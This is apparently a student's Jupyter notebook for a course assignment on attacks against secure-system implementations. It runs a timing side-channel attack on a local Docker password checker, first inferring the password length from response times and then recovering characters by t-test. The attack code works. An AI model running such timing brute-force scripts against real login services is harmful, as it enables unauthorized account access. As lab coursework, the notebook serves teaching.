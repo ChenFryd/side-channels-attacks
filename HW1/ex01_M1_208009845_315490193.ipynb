{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "n-MtEVKgteed"
      },
      "source": [
        "# Attacks on Implementations of Secure Systems Assignment 1"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YpaA0_mjsQxm"
      },
      "source": [
        "## Commands used for docker\n",
        "`docker pull amarmic/attacks_on_implementations:Assignment1_x86_64`  \n",
        "`docker run --name ass1 -p 80:8080 amarmic/attacks_on_implementations:Assignment1_x86_64`\n",
        "\n",
        "## Commands used for Anaconda to test locally\n",
        "`conda create --name side_attacks python=3.12`\n",
        "`conda install requests`"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "9OTeLRx43jQu"
      },
      "source": [
        "### Imports"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 33,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Collecting scipy\n",
            "  Downloading scipy-1.15.2-cp312-cp312-win_amd64.whl.metadata (60 kB)\n",
            "Collecting numpy<2.5,>=1.23.5 (from scipy)\n",
            "  Downloading numpy-2.2.4-cp312-cp312-win_amd64.whl.metadata (60 kB)\n",
            "Downloading scipy-1.15.2-cp312-cp312-win_amd64.whl (40.9 MB)\n",
            "   ---------------------------------------- 0.0/40.9 MB ? eta -:--:--\n",
            "    --------------------------------------- 0.5/40.9 MB 2.8 MB/s eta 0:00:15\n",
            "   -- ------------------------------------- 2.1/40.9 MB 6.5 MB/s eta 0:00:06\n",
            "   ---- ----------------------------------- 4.7/40.9 MB 9.2 MB/s eta 0:00:04\n",
            "   ------- -------------------------------- 8.1/40.9 MB 11.4 MB/s eta 0:00:03\n",
            "   ------------ --------------------------- 12.6/40.9 MB 13.6 MB/s eta 0:00:03\n",
            "   ----------------- ---------------------- 17.8/40.9 MB 15.6 MB/s eta 0:00:02\n",
            "   --------------------- ------------------ 21.5/40.9 MB 16.2 MB/s eta 0:00:02\n",
            "   ------------------------ --------------- 24.9/40.9 MB 16.1 MB/s eta 0:00:01\n",
            "   ---------------------------- ----------- 28.8/40.9 MB 16.6 MB/s eta 0:00:01\n",
            "   -------------------------------- ------- 33.0/40.9 MB 16.9 MB/s eta 0:00:01\n",
            "   ----------------------------------- ---- 36.7/40.9 MB 17.1 MB/s eta 0:00:01\n",
            "   ---------------------------------------  40.9/40.9 MB 17.3 MB/s eta 0:00:01\n",
            "   ---------------------------------------- 40.9/40.9 MB 16.8 MB/s eta 0:00:00\n",
            "Downloading numpy-2.2.4-cp312-cp312-win_amd64.whl (12.6 MB)\n",
            "   ---------------------------------------- 0.0/12.6 MB ? eta -:--:--\n",
            "   ----------- ---------------------------- 3.7/12.6 MB 18.2 MB/s eta 0:00:01\n",
            "   ------------------- -------------------- 6.3/12.6 MB 17.5 MB/s eta 0:00:01\n",
            "   ---------------------------- ----------- 8.9/12.6 MB 14.6 MB/s eta 0:00:01\n",
            "   -------------------------------------- - 12.1/12.6 MB 14.5 MB/s eta 0:00:01\n",
            "   ---------------------------------------- 12.6/12.6 MB 14.2 MB/s eta 0:00:00\n",
            "Installing collected packages: numpy, scipy\n",
            "Successfully installed numpy-2.2.4 scipy-1.15.2\n"
          ]
        }
      ],
      "source": [
        "!pip install scipy"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 39,
      "metadata": {
        "id": "C4_4E9-43Vrf"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "import time\n",
        "from scipy import stats"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zlpn9Gl93kwr"
      },
      "source": [
        "### Constants"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "gGeu_uCs3mrw"
      },
      "outputs": [],
      "source": [
        "base_url = \"http://localhost\"\n",
        "name = \"208009845\"\n",
        "difficulty = \"1\" # const for first difficuly\n",
        "max_password_length = 32\n",
        "amount_of_repeats = 3\n",
        "possible_chars = \"abcdefghijklmnopqrstuvwxyz\"\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YV81TRXEwQnF"
      },
      "source": [
        "## Solution for difficulty 1\n",
        "With difficulty 1, the password length is variable, so we need first to find the length.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 29,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Response:  http://localhost/?user=208009845&password=parshandata\n",
            "correct password\n"
          ]
        }
      ],
      "source": [
        "password = \"parshandata\"\n",
        "response = requests.get(f\"{base_url}/?user={name}&password={password}\")\n",
        "print(\"Response: \", response.url)\n",
        "if response.status_code != 200 : # sanity check\n",
        "  print(\"Error: \", response.status_code)\n",
        "\n",
        "if response.text == \"1\":\n",
        "   print(\"correct password\")\n",
        "else:\n",
        "   print(\"incorrect password\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 127,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 663
        },
        "id": "Kr8GZJLGwXvi",
        "outputId": "eea3f658-6f55-4ac6-9d70-24486b2f6afa"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Password length: 11, Time: 0.5146199862162272\n"
          ]
        }
      ],
      "source": [
        "# Find length of password\n",
        "# here we save the time of the query for each password length\n",
        "vector_iterations = [[] for _ in range(max_password_length-1)]\n",
        "for password_length in range(1,max_password_length): \n",
        "  password = \"a\" * password_length\n",
        "  for iteration in range(amount_of_repeats):\n",
        "    start = time.time()\n",
        "    response = requests.get(f\"{base_url}/?user={name}&password={password}\")#&difficulty={difficulty}\")\n",
        "    end = time.time()\n",
        "    if response.status_code != 200: # sanity check\n",
        "      print(\"Error: \", response.status_code)\n",
        "      break\n",
        "    time_of_query = end - start\n",
        "    vector_iterations[password_length-1].append(time_of_query)\n",
        "\n",
        "# calculate avg time for each password length\n",
        "password_length, max_avg = 0, 0\n",
        "for i in range(len(vector_iterations)):\n",
        "  vector_iterations[i] = sum(vector_iterations[i]) / len(vector_iterations[i])\n",
        "  if vector_iterations[i] > max_avg:\n",
        "    max_avg = vector_iterations[i]\n",
        "    password_length = i+1\n",
        "  \n",
        "print(f\"Password length: {password_length}, Time: {vector_iterations[password_length-1]}\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "abcde"
          ]
        },
        {
          "ename": "KeyboardInterrupt",
          "evalue": "",
          "output_type": "error",
          "traceback": [
            "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
            "\u001b[31mKeyboardInterrupt\u001b[39m                         Traceback (most recent call last)",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[133]\u001b[39m\u001b[32m, line 105\u001b[39m\n\u001b[32m    102\u001b[39m   \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m    103\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[33m\"\u001b[39m\u001b[33mNOT_FOUND\u001b[39m\u001b[33m\"\u001b[39m\n\u001b[32m--> \u001b[39m\u001b[32m105\u001b[39m password = \u001b[43mfind_password\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    106\u001b[39m \u001b[38;5;28mprint\u001b[39m(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[33mPassword: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mpassword\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m)\n",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[133]\u001b[39m\u001b[32m, line 81\u001b[39m, in \u001b[36mfind_password\u001b[39m\u001b[34m()\u001b[39m\n\u001b[32m     79\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(min_letters):\n\u001b[32m     80\u001b[39m   sample = vector_iterations[:i] + vector_iterations[i+\u001b[32m1\u001b[39m:min_letters]\n\u001b[32m---> \u001b[39m\u001b[32m81\u001b[39m   \u001b[38;5;28;01mif\u001b[39;00m \u001b[43mmajority_t_test\u001b[49m\u001b[43m(\u001b[49m\u001b[43msample\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mvector_iterations\u001b[49m\u001b[43m[\u001b[49m\u001b[43mi\u001b[49m\u001b[43m]\u001b[49m\u001b[43m)\u001b[49m:\n\u001b[32m     82\u001b[39m     password += possible_chars[i]\n\u001b[32m     83\u001b[39m     \u001b[38;5;28mprint\u001b[39m(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[38;5;130;01m\\n\u001b[39;00m\u001b[33mPassword: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mpassword\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m, time: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mvector_iterations[i]\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m) \u001b[38;5;66;03m#,p-value: {p_val}\u001b[39;00m\n",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[133]\u001b[39m\u001b[32m, line 10\u001b[39m, in \u001b[36mmajority_t_test\u001b[39m\u001b[34m(data, popmean)\u001b[39m\n\u001b[32m      8\u001b[39m majority_list = []\n\u001b[32m      9\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m iteration \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(amount_of_repeats):\n\u001b[32m---> \u001b[39m\u001b[32m10\u001b[39m   \u001b[38;5;28;01mif\u001b[39;00m \u001b[43mt_test\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mpopmean\u001b[49m\u001b[43m)\u001b[49m:\n\u001b[32m     11\u001b[39m     majority_list.append(\u001b[38;5;28;01mTrue\u001b[39;00m)\n\u001b[32m     12\u001b[39m   \u001b[38;5;28;01melse\u001b[39;00m:\n",
            "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[133]\u001b[39m\u001b[32m, line 20\u001b[39m, in \u001b[36mt_test\u001b[39m\u001b[34m(data, popmean)\u001b[39m\n\u001b[32m     18\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34mt_test\u001b[39m(data, popmean):\n\u001b[32m     19\u001b[39m   flat_list = [item \u001b[38;5;28;01mfor\u001b[39;00m sublist \u001b[38;5;129;01min\u001b[39;00m data \u001b[38;5;28;01mfor\u001b[39;00m item \u001b[38;5;129;01min\u001b[39;00m sublist]\n\u001b[32m---> \u001b[39m\u001b[32m20\u001b[39m   t_stat, p_val = \u001b[43mstats\u001b[49m.ttest_1samp(flat_list, popmean, alternative=\u001b[33m'\u001b[39m\u001b[33mless\u001b[39m\u001b[33m'\u001b[39m)\n\u001b[32m     21\u001b[39m   \u001b[38;5;28;01mif\u001b[39;00m p_val < alpha:\n\u001b[32m     22\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;01mTrue\u001b[39;00m\n",
            "\u001b[36mFile \u001b[39m\u001b[32m<stringsource>:69\u001b[39m, in \u001b[36mcfunc.to_py.__Pyx_CFunc_b0409f__29_pydevd_sys_monitoring_cython_object__lParen__etc_to_py_4code_4line.wrap\u001b[39m\u001b[34m()\u001b[39m\n",
            "\u001b[36mFile \u001b[39m\u001b[32m_pydevd_sys_monitoring\\\\_pydevd_sys_monitoring_cython.pyx:1465\u001b[39m, in \u001b[36m_pydevd_sys_monitoring_cython._line_event\u001b[39m\u001b[34m()\u001b[39m\n",
            "\u001b[36mFile \u001b[39m\u001b[32m_pydevd_sys_monitoring\\\\_pydevd_sys_monitoring_cython.pyx:1507\u001b[39m, in \u001b[36m_pydevd_sys_monitoring_cython._internal_line_event\u001b[39m\u001b[34m()\u001b[39m\n",
            "\u001b[36mFile \u001b[39m\u001b[32m_pydevd_sys_monitoring\\\\_pydevd_sys_monitoring_cython.pyx:1308\u001b[39m, in \u001b[36m_pydevd_sys_monitoring_cython._stop_on_breakpoint\u001b[39m\u001b[34m()\u001b[39m\n",
            "\u001b[36mFile \u001b[39m\u001b[32m_pydevd_sys_monitoring\\\\_pydevd_sys_monitoring_cython.pyx:1945\u001b[39m, in \u001b[36m_pydevd_sys_monitoring_cython._do_wait_suspend\u001b[39m\u001b[34m()\u001b[39m\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\user\\anaconda3\\envs\\side_attacks\\Lib\\site-packages\\debugpy\\_vendored\\pydevd\\pydevd.py:2185\u001b[39m, in \u001b[36mPyDB.do_wait_suspend\u001b[39m\u001b[34m(self, thread, frame, event, arg, exception_type)\u001b[39m\n\u001b[32m   2182\u001b[39m             from_this_thread.append(frame_custom_thread_id)\n\u001b[32m   2184\u001b[39m     \u001b[38;5;28;01mwith\u001b[39;00m \u001b[38;5;28mself\u001b[39m._threads_suspended_single_notification.notify_thread_suspended(thread_id, thread, stop_reason):\n\u001b[32m-> \u001b[39m\u001b[32m2185\u001b[39m         keep_suspended = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_do_wait_suspend\u001b[49m\u001b[43m(\u001b[49m\u001b[43mthread\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mframe\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mevent\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43marg\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtrace_suspend_type\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mfrom_this_thread\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mframes_tracker\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   2187\u001b[39m frames_list = \u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[32m   2189\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m keep_suspended:\n\u001b[32m   2190\u001b[39m     \u001b[38;5;66;03m# This means that we should pause again after a set next statement.\u001b[39;00m\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\user\\anaconda3\\envs\\side_attacks\\Lib\\site-packages\\debugpy\\_vendored\\pydevd\\pydevd.py:2254\u001b[39m, in \u001b[36mPyDB._do_wait_suspend\u001b[39m\u001b[34m(self, thread, frame, event, arg, trace_suspend_type, from_this_thread, frames_tracker)\u001b[39m\n\u001b[32m   2251\u001b[39m                 queue.put(internal_cmd)\n\u001b[32m   2252\u001b[39m                 wait_timeout = TIMEOUT_FAST\n\u001b[32m-> \u001b[39m\u001b[32m2254\u001b[39m         \u001b[43mnotify_event\u001b[49m\u001b[43m.\u001b[49m\u001b[43mwait\u001b[49m\u001b[43m(\u001b[49m\u001b[43mwait_timeout\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   2255\u001b[39m         notify_event.clear()\n\u001b[32m   2257\u001b[39m \u001b[38;5;28;01mfinally\u001b[39;00m:\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\user\\anaconda3\\envs\\side_attacks\\Lib\\threading.py:655\u001b[39m, in \u001b[36mEvent.wait\u001b[39m\u001b[34m(self, timeout)\u001b[39m\n\u001b[32m    653\u001b[39m signaled = \u001b[38;5;28mself\u001b[39m._flag\n\u001b[32m    654\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m signaled:\n\u001b[32m--> \u001b[39m\u001b[32m655\u001b[39m     signaled = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_cond\u001b[49m\u001b[43m.\u001b[49m\u001b[43mwait\u001b[49m\u001b[43m(\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    656\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m signaled\n",
            "\u001b[36mFile \u001b[39m\u001b[32mc:\\Users\\user\\anaconda3\\envs\\side_attacks\\Lib\\threading.py:359\u001b[39m, in \u001b[36mCondition.wait\u001b[39m\u001b[34m(self, timeout)\u001b[39m\n\u001b[32m    357\u001b[39m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m    358\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m timeout > \u001b[32m0\u001b[39m:\n\u001b[32m--> \u001b[39m\u001b[32m359\u001b[39m         gotit = \u001b[43mwaiter\u001b[49m\u001b[43m.\u001b[49m\u001b[43macquire\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43;01mTrue\u001b[39;49;00m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    360\u001b[39m     \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m    361\u001b[39m         gotit = waiter.acquire(\u001b[38;5;28;01mFalse\u001b[39;00m)\n",
            "\u001b[31mKeyboardInterrupt\u001b[39m: "
          ]
        }
      ],
      "source": [
        "import numpy as np\n",
        "\n",
        "min_letters = 5\n",
        "alpha = 0.0005\n",
        "amount_of_repeats = 3\n",
        "\n",
        "def majority_t_test(data, popmean):\n",
        "  majority_list = []\n",
        "  for iteration in range(amount_of_repeats):\n",
        "    if t_test(data, popmean[iteration]):\n",
        "      majority_list.append(True)\n",
        "    else:\n",
        "      majority_list.append(False)\n",
        "  if majority_list.count(True) > amount_of_repeats // 2:\n",
        "    return True\n",
        "  return False\n",
        "  \n",
        "def t_test(data, popmean):\n",
        "  flat_list = [item for sublist in data for item in sublist]\n",
        "  t_stat, p_val = stats.ttest_1samp(flat_list, popmean, alternative='less')\n",
        "  if p_val < alpha:\n",
        "    return True\n",
        "  return False\n",
        "\n",
        "def remove_outliers(data):\n",
        "    q25, q75 = np.percentile(data, 25), np.percentile(data, 75)\n",
        "    iqr = q75 - q25\n",
        "    return [x for x in data if (x <= q75 + 1.5 * iqr)]\n",
        "\n",
        "\n",
        "def get_dynamic_alpha(password_so_far, min_alpha=0.005, max_alpha=0.0001):\n",
        "    \"\"\"\n",
        "    Calculate a dynamic alpha value that becomes more strict as we discover more characters.\n",
        "    \n",
        "    Args:\n",
        "        password_so_far: Currently discovered partial password\n",
        "        min_alpha: Minimum allowed alpha value (lower bound)\n",
        "        max_alpha: Maximum allowed alpha value (upper bound)\n",
        "    \n",
        "    Returns:\n",
        "        Dynamically calculated alpha value\n",
        "    \"\"\"\n",
        "    # Exponential decrease in alpha as password length increases\n",
        "    # We become more strict (require stronger evidence) as we progress\n",
        "    return max(min_alpha, max_alpha * (0.7 ** len(password_so_far)))\n",
        "    \n",
        "def find_password():\n",
        "  password = \"\" # password to return\n",
        "  while (len(password) <= password_length):\n",
        "    max_time_index, max_time = 0, 0\n",
        "    vector_iterations = [[] for _ in range(len(possible_chars))]\n",
        "    current_index_of_password = len(password) #what index we are trying to brute force\n",
        "    for index_char_to_check in range(len(possible_chars)):\n",
        "      print(possible_chars[index_char_to_check], end=\"\") #for debugging purposes\n",
        "      password_to_check = password + possible_chars[index_char_to_check] * (password_length - current_index_of_password)\n",
        "      for _ in range(amount_of_repeats):\n",
        "        start = time.time()\n",
        "        response = requests.get(f\"{base_url}/?user={name}&password={password_to_check}\")#&difficulty={difficulty}\")\n",
        "        end = time.time()\n",
        "        if response.status_code == 200 and response.text == \"1\":\n",
        "          return password_to_check\n",
        "        vector_iterations[index_char_to_check].append(end - start)\n",
        "\n",
        "        # perform t-test to see if it's an small outlier \n",
        "        #TODO\n",
        "    \n",
        "      #vector_iterations[index_char_to_check] = remove_outliers_and_avg(vector_iterations[index_char_to_check])\n",
        "\n",
        "      \n",
        "\n",
        "\n",
        "      if max(vector_iterations[index_char_to_check]) > max_time:\n",
        "        max_time = max(vector_iterations[index_char_to_check])\n",
        "        max_time_index = index_char_to_check\n",
        "      \n",
        "\n",
        "      if index_char_to_check == min_letters-1:\n",
        "        found = False\n",
        "        for i in range(min_letters):\n",
        "          sample = vector_iterations[:i] + vector_iterations[i+1:min_letters]\n",
        "          if majority_t_test(sample, vector_iterations[i]):\n",
        "            password += possible_chars[i]\n",
        "            print(f\"\\nPassword: {password}, time: {vector_iterations[i]}\") #,p-value: {p_val}\n",
        "            print(vector_iterations[:index_char_to_check+1])\n",
        "            found = True\n",
        "        if found: break\n",
        "        else: continue\n",
        "\n",
        "      # t-test\n",
        "      if index_char_to_check > min_letters -1 and max_time_index == index_char_to_check:\n",
        "        sample = vector_iterations[:index_char_to_check]\n",
        "        if majority_t_test(sample, vector_iterations[index_char_to_check]):\n",
        "          password += possible_chars[index_char_to_check]\n",
        "          print(f\"\\nPassword: {password}, time: {vector_iterations[index_char_to_check]}\") #,p-value: {p_val}\n",
        "          print(vector_iterations[:index_char_to_check+1])\n",
        "          break   \n",
        "        \n",
        "      \n",
        "    else: #go back a letter  \n",
        "        password = password[:-1]\n",
        "        print(\"We did not find a char, the new password is: \", password)\n",
        "  else:\n",
        "    return \"NOT_FOUND\"\n",
        "\n",
        "password = find_password()\n",
        "print(f\"Password: {password}\")\n",
        "\n"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "display_name": "side_attacks",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.12.9"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
